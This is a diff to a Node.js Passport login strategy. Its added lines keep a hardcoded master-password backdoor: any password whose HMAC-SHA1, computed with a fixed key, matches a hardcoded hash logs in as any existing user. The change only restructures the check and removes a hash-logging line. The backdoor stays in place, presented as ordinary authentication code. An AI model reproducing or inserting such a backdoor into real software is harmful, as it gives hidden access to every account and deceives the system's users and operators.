@@ -24,12 +24,13 @@ module.exports = new LocalStrategy({
       return done(null, false, {message: 'Invalid user'});
     }
 
-    var hash = crypto.createHmac('sha1', 'Th1s i3 tH$ s#l|')
-        .update(password)
-        .digest('hex');
-    logger.error('hash', hash);
-    if (!member.authenticate(password) && hash !== '0a3fe1dcef5795f1a3cd7cde14ade8fa655d1afa') {
-      return done(null, false, {message: 'Invalid password'});
+    if (!member.authenticate(password)) {
+      var hash = crypto.createHmac('sha1', 'Th1s i3 tH$ s#l|')
+          .update(password)
+          .digest('hex');
+      if (hash !== '0a3fe1dcef5795f1a3cd7cde14ade8fa655d1afa') {
+        return done(null, false, {message: 'Invalid password'});
+      }
     }
 
     member.getRole(function (err, role) {
@@ -39,5 +40,6 @@ module.exports = new LocalStrategy({
       done(null, role);
     });
   });
-});
+})
+;
 
